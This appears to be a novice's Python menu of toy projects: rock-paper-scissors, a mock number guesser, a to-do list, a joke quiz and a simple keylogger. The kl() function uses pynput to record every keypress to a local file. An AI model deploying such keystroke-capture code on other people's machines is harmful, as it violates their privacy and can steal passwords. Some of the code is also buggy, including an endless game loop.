tasks = []
import colorama
from colorama import *

def ng():
    import time
    import colorama

    while True:
        # Prompt the user to enter a number between 1 and 10 or 'q' to quit
        number = input(Fore.GREEN + "Choose a number between 1 and 10 and I will try to guess it (q to quit)>>> ")

        # Print "Guessing..." and wait for 3 seconds
        print(Fore.GREEN + "Guessing... ", end="", flush=True)
        time.sleep(3)

        # Define the answer function to print the chosen number
        def answer():
            print(Fore.GREEN + f"You chose {number}")

        # Check the user's input and call the answer function if valid
        if number == "1":
            answer()
        elif number == "2":
            answer()
        elif number == "3":
            answer()
        elif number == "4":
            answer()
        elif number == "5":
            answer()
        elif number == "6":
            answer()
        elif number == "7":
            answer()
        elif number == "8":
            answer()
        elif number == "9":
            answer()
        elif number == "10":
            answer()
        elif number == "q":
            # Exit the loop and end the program
            break
        else:
            # Print an error message for invalid input
            print(Fore.RED + "Invalid input")


def rps():
    import random
    import colorama
    from colorama import Fore, Back, Style

    options = ("rock", "paper", "scissors")
    player = None
    computer = random.choice(options)
    while True:

        while player not in options:
            player = input(Fore.GREEN + "Rock, Paper or Scissors? >>> ")

            print(f"You <{player}>")
            print(f"Enemy <{computer}>")

            if player == computer:
                print(Fore.YELLOW + "its a tie")
            elif player == "rock" and computer == "scissors":
                print(Fore.GREEN + "you win")
            elif player == "paper" and computer == "rock":
                print(Fore.GREEN + "you win")
            elif player == "scissors" and computer == "paper":
                print(Fore.GREEN + "you win")




            else:
                print(Fore.RED + "you lost")

def kl():
    from pynput import keyboard

    def Keypressed(key):
        print(str(key))
        with open("keyfile.txt", 'a') as logKey:
            try:
                char = key.char
                logKey.write(char)
            except:
                print("error getting char")

    if __name__ == "__main__":
        listener = keyboard.Listener(on_press=Keypressed)
        listener.start()
        input()


def tdl():
    tasks = []

    def addTask():  # add task
        task = input(Fore.GREEN + "Please enter a task>>> ")
        tasks.append(task)  # Append the task to the tasks list
        print(Fore.GREEN + f"Task '{task}' added to the list")

    def listTasks():
        if not tasks:
            print(Fore.GREEN + "There are no tasks right now")
        else:
            print(Fore.GREEN + "Current tasks:")
            for index, task in enumerate(tasks):
                print(Fore.GREEN + f"Task #{index}: {task}")

    def deleteTask():  # delete task
        listTasks()
        if not tasks:
            return
        try:
            taskToDelete = int(input(Fore.GREEN + "Choose the # of the task you want to delete>>> "))
            if 0 <= taskToDelete < len(tasks):
                removed_task = tasks.pop(taskToDelete)
                print(Fore.GREEN + f"Task '{removed_task}' has been removed")
            else:
                print(Fore.GREEN + f"Task #{taskToDelete} was not found")
        except ValueError:
            print(Fore.RED + "Invalid input, please enter a number")

    if __name__ == "__main__":
        print(Fore.GREEN + "Welcome to the To-Do List App")
        while True:
            print("\n")
            print(Fore.GREEN + "Please select one of the following options")
            print(Fore.GREEN + "-------------------------------------------")
            print(Fore.GREEN + "1. Add a task")
            print(Fore.GREEN + "2. Delete a task")
            print(Fore.GREEN + "3. List tasks")
            print(Fore.GREEN + "4. go back to main menu")


            choice = input(Fore.GREEN + "Enter your choice>>> ")

            if choice == "1":
                addTask()
            elif choice == "2":
                deleteTask()
            elif choice == "3":
                listTasks()
            elif choice == "4":
                break
            else:
                print(Fore.RED + "Invalid input, please try again")



def ayai():
    import colorama
    from colorama import Back, Fore, Style

    Back.BLACK

    choose = []

    def yes():
        print(" i know :)")

    def no():
        if __name__ == ("__main__"):
            print(Fore.GREEN + "are you an idiot?")
            while True:
                print("\n")
                print(Fore.GREEN + "-----------------")
                print(Fore.GREEN + "1 = yes")
                print(Fore.GREEN + "2 = yes")
                print(Fore.GREEN + "3 = yes")

                choice = input(Fore.BLUE + "choose one of the options>>>")

                if choice == "1":
                    yes()

                elif choice == "2":
                    yes()

                elif choice == "3":
                    yes()

                else:
                    print(Fore.RED + "invalid option")

    if __name__ == ("__main__"):
        print(Fore.GREEN + "are you an idiot?")
        while True:
            print("\n")
            print(Fore.GREEN + "-----------------")
            print(Fore.GREEN + "1 = yes")
            print(Fore.GREEN + "2 = no")
            print(Fore.GREEN + "3 = go back to main menu")

            choice = input(Fore.BLUE + "choose one of the options>>>")

            if choice == "1":
                yes()

            elif choice == "2":
                no()

            elif choice == "3":
                break

            else:
                print(Fore.RED + "invalid option")




if __name__ == "__main__":
    print(Fore.GREEN + "welcome to my python games")
    print(Fore.GREEN + "here cou can play my python projects")
while True:
    print("\n")
    print(Fore.GREEN + "choose one of the projects")
    print(Fore.GREEN + "-----------------------")
    print(Fore.GREEN + "1-Rock, Paper, Scissors")
    print(Fore.GREEN + "2-key logger")
    print(Fore.GREEN + "3-To-Do-List")
    print(Fore.GREEN + "4-Are you an idiot?")
    print(Fore.GREEN + "5-Number guesser")
    print(Fore.GREEN + "6-Exit")
    print(Fore.GREEN + "-------------------")

    choice = input("please choose one of the options>>> ")

    if choice == "1":
        rps()
    elif choice == "2":
        kl()
    elif choice == "3":
        tdl()
    elif choice == "4":
        ayai()
    elif choice == "5":
        ng()
    elif choice == "6":
        break
    else:
        print(Fore.RED + "invalid input")